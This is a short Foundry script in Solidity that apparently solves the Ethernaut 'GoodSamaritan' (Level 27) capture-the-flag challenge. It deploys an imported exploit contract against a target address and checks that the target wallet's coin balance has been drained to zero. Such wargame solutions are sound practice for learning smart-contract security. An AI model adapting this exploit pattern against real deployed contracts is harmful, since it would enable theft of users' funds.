pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Coin, GoodSamaritan, Wallet} from "../src/Level27.sol";
import {GoodSamaritanExploit} from "../src/Level27Exploit.sol";

contract Level27Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        GoodSamaritanExploit e = new GoodSamaritanExploit();
        e.exploit(_target);
    }

    function levelDone(address _target) private returns (bool) {
        address coinAddr = GoodSamaritan(_target).coin();
        address wallet = GoodSamaritan(_target).wallet();
        return Coin(coinAddr).balances(wallet) == 0;
    }
}
